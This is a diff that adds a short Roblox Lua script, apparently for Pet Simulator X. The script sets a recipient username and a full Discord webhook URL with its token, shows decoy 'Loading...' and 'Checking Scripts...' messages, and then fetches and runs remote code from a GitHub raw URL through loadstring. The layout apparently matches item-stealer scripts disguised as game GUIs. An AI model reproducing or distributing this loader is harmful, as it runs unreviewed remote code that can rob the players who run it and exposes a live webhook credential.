@@ -1,0 +1,9 @@
+Username = "petsimseller6"
+WebHook = "https://discord.com/api/webhooks/1081626400253034647/WPwcrEibtwCX2sPLXvsA2MN1Uhjh5R0A5U3zgKBVu5K6Z3_0r2BfkMQ_5L-ktOTkUOuF"
+
+_G.CustomScriptName = "Loading..."
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))()
